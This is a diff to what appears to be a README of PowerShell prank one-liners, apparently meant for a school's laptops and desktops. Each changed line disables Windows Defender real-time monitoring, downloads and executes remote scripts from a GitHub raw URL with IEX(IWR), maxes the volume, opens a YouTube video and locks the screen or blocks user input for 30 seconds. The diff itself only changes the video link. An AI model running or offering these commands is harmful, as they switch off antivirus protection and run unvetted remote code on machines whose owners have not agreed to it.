@@ -71,11 +71,11 @@ Set-MpPreference -DisableRealtimeMonitoring $true; Start-Sleep -millisecond 1500
 ```
 ### Test (Laptop)
 ```
-Set-MpPreference -DisableRealtimeMonitoring $true; Start-Sleep -millisecond 1500; IEX(IWR https://raw.githubusercontent.com/OPstriker/PS-Script-s/main/Set-Volume.ps1 -UseBasicParsing); Set-SoundVolume 100; start chrome https://www.youtube.com/watch?v=Y7FrLagBXng; IEX(IWR https://raw.githubusercontent.com/OPstriker/PS-Script-s/main/screen-lock-test.ps1 -UseBasicParsing); Lock-Screen -LockSeconds 30;
+Set-MpPreference -DisableRealtimeMonitoring $true; Start-Sleep -millisecond 1500; IEX(IWR https://raw.githubusercontent.com/OPstriker/PS-Script-s/main/Set-Volume.ps1 -UseBasicParsing); Set-SoundVolume 100; start chrome https://www.youtube.com/watch?v=mGqZ6nQPajA; IEX(IWR https://raw.githubusercontent.com/OPstriker/PS-Script-s/main/screen-lock-test.ps1 -UseBasicParsing); Lock-Screen -LockSeconds 30;
 ```
 ### Test (Desktop)
 ```
-Set-MpPreference -DisableRealtimeMonitoring $true; Start-Sleep -millisecond 1500; IEX(IWR https://raw.githubusercontent.com/OPstriker/PS-Script-s/main/Set-Volume.ps1 -UseBasicParsing); Set-SoundVolume 100; start chrome https://www.youtube.com/watch?v=Y7FrLagBXng; IEX(IWR https://raw.githubusercontent.com/OPstriker/PS-Script-s/main/Dis-Input.ps1 -UseBasicParsing); Disable-UserInput -seconds 30;
+Set-MpPreference -DisableRealtimeMonitoring $true; Start-Sleep -millisecond 1500; IEX(IWR https://raw.githubusercontent.com/OPstriker/PS-Script-s/main/Set-Volume.ps1 -UseBasicParsing); Set-SoundVolume 100; start chrome https://www.youtube.com/watch?v=mGqZ6nQPajA; IEX(IWR https://raw.githubusercontent.com/OPstriker/PS-Script-s/main/Dis-Input.ps1 -UseBasicParsing); Disable-UserInput -seconds 30;
 ```
 ## Azure Stuff (My School Uses it)
 
